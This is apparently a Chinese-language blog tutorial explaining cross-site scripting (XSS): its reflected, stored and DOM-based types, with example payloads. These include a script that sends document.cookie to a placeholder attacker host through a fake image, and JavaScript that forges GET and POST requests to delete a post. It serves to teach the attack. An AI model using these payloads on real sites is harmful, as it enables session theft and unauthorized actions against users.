XSS:跨站脚本攻击

Written by Vshows

什么是XSS？

首先，引入XSS的英文名:Cross Site Scripting，翻译为跨站脚本攻击，与臭名昭著的SQL注入一样，是一种攻击成本低，但攻击带来的回报却可能无限大的一种攻击方式。在这里你可能会问了，问什么它的英文缩写是XSS而不是CSS呢？因为CSS代表的是层叠样式表(此处不多介绍)。。。

SQL注入是在攻击中加入恶意的SQL语句，达到攻击者对数据的一系列操作，而与此对应，XSS便是通过在网页中加入恶意脚本(一般是javascript代码)来达到对用户浏览器的控制。(但是，这种方法的成功率并不是那么高，毕竟现实网络中对于XSS的过滤和还是比较常见的)，但是，这种通过”HTML注入”篡改网页，嵌入恶意脚本代码的方式，控制用户浏览器的一种方式，确实却是最为危险的一种方式。这种用以完成各种功能的恶意脚本，叫做 “XSS Payload”。

XSS的种类：

关于XSS的分类，其实并不是那么的一致，大部分的人将其分为两类:反射性XSS也叫非持久性XSS，而另外一种是:存储性XSS，也叫持久性XSS，下面就分类介绍下这两类XSS攻击的原理及流程。

1.反射性XSS：

反射性XSS只是简单的把用户输入的数据”反射”给服务器，即攻击者必须诱使用户点击一个恶意链接，那么此次攻击才能进行。基于反射性XSS的攻击特点类似于生物的神经反射，由此得名。有时，反射性XSS也叫”非持久性XSS”，基于它的即时性，不持久性。

2.存储型XSS：

存储型XSS会把用户输入的数据储存在远程服务器端，因为是基于服务器端的攻击，所以这种攻击具有很强的稳定性。

3.DOM Based XSS:

与上面两种XSS的分类方式不同，这种类型的XSS并非按照数据是否储存在服务器端来划分其类型，其实从其本质上来讲，DOM Based XSS也属于反射性XSS。而之所以将其单独划分出来，是因为DOM Based XSS的形成方式比较的特殊。

而它的攻击方式，则是它的名字的由来。顾名思义，这种攻击方式是通过修改页面的DOM 节点形成的XSS，由此而来。

XSS实例初探

1.获取浏览器的Cookie对象

我们都知道,Cookie中加密保存了当前用户的登陆凭证，是用户身份的最有力的证明，而Cookie的获取，也恰恰是攻击者最喜欢的东西之一。一旦攻击者获得了用户的Cookie，也就意味着攻击者可以不通过密码，直接登录进用户的账号。

一般来说，攻击者会先运行一个远程脚本:

http://www.xx.com/test.htm?abc="><script src=http://www.xxx.com/xxx.js ></script>

攻击者利用该远程脚本来获得Cookie，其实真正的获取Cookie的代码是在远程的JavaScript代码中，这样做的目的避免在URL参数中直接写入大量的代码。

下面是远程脚本 xxx.js的内容：

var img = document.createElement("img");
img.src = "http://xxx.com/log?"+escape(document.cookie);
document.body.appendChild(img);

在这段代码中，显示通过一张虚假的图片，获取到cookie，并把cookie对象对象发送到攻击者远程的服务器。

应该注意到，目标服务器 http://www.xxx.com/log 并不一定是真实存在的。使用此条代码的作用是在远程服务器的 Web上留下记录：

由此便完成了一个最简单的XSS Payload。

2.构造GET和POST请求

在HTTP协议中，GET和POST无疑是两大支柱请求。对于攻击者来说，通过JavaScript，就可以让浏览器发起这两种请求。

下面我们模拟删除某论坛上的文章(假想该网站存在XSS漏洞，实际上可能性不大)：

下面是正常删除该文章的链接:http://blog.xxx.com/manage/entry.do?m=delete&id=123456789

对于攻击者来说，只要知道了文章的ID，便可以通过请求来删除这个文章了。假设ID为123456789(无敌账号)

最简单的，最好用的当属虚假图片了。。。

var img = document.createElement("img");
img.src = "http://www.blog.xxx.com/manage/entry.do?m=delete&id=123456789";
document.body.appendChild(img);

现在攻击者所要做的就是诱使博客的作者执行这段代码，便可将博客删除

但这并不是太完美，下面我们假设网站接受POST请求，我们构造POST请求来删除这篇文章。。

要模拟这一过程，我们先构造一个form表单，然后自动提交:

var f = document.createElement("form");
f.action = "";
f.method = "post";
document.body.appendChild(f);

var l1 = document.createElement("input");
l1.name = " ck";
l1.value = " JiUY";
f.appendChild(l1);

var l2 = document.createElement("input");
l2.name = " mb_text";
l2.value = "test";
f.appendChild(l2);

f.submit();

假若提交的表单过多的话，通过构造DOM节点的方式，代码会变得十分的冗杂。此时直接写HTML代码，会简洁的多。

var d = document.createElement("div");
document.body.appendChild(d);
d.innerHTML = '<form action="" method="post" id="xssform" name="mbform">'+
'<input type="hidden" value="JiUY" name="cl" />'+
'<input type="text" value="test" name="mb_text" />' +
'</form>'

document.getElementById("xssform").submit();

自动表单提交成功！

小结:

关于XSS，他是一种强大的攻击与测试方式，更多关于XSS的探究会在以后的博文中继续。
